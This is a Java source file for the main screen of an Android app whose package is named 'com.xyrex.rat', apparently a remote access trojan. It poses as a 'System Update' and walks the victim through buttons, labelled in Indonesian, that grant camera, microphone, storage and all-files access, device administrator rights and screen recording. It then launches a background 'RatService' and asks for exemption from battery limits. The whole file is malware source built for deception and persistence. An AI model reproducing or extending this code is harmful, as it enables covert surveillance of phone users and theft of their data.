package com.xyrex.rat;
import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    @Override protected void onCreate(Bundle b){
        super.onCreate(b);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(48,48,48,48);
        TextView tv = new TextView(this);
        tv.setText("System Update\n\nAktifkan izin berikut sekali saja:");
        ll.addView(tv);

        Button perm = new Button(this);
        perm.setText("1. Beri Izin");
        perm.setOnClickListener(v -> requestPerms());
        ll.addView(perm);

        Button adm = new Button(this);
        adm.setText("2. Aktifkan Device Admin");
        adm.setOnClickListener(v -> {
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            startActivity(i);
        });
        ll.addView(adm);

        Button proj = new Button(this);
        proj.setText("3. Izinkan Rekam Layar");
        proj.setOnClickListener(v -> startActivity(new Intent(this, ScreenCaptureActivity.class)));
        ll.addView(proj);

        Button start = new Button(this);
        start.setText("4. Mulai");
        start.setOnClickListener(v -> {
            try {
                Intent svc = new Intent(this, RatService.class);
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
            } catch (Exception e){}
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (!pm.isIgnoringBatteryOptimizations(getPackageName())){
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:"+getPackageName()));
                    startActivity(i);
                }
            } catch (Exception e){}
            finish();
        });
        ll.addView(start);

        setContentView(ll);
    }

    private void requestPerms(){
        java.util.List<String> p = new java.util.ArrayList<>();
        p.add(Manifest.permission.CAMERA);
        p.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33){
            p.add(Manifest.permission.POST_NOTIFICATIONS);
            p.add(Manifest.permission.READ_MEDIA_IMAGES);
            p.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            p.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        ActivityCompat.requestPermissions(this, p.toArray(new String[0]), 99);
        if (Build.VERSION.SDK_INT >= 30){
            try {
                if (!android.os.Environment.isExternalStorageManager()){
                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    i.setData(Uri.parse("package:"+getPackageName()));
                    startActivity(i);
                }
            } catch (Exception e){}
        }
    }
}
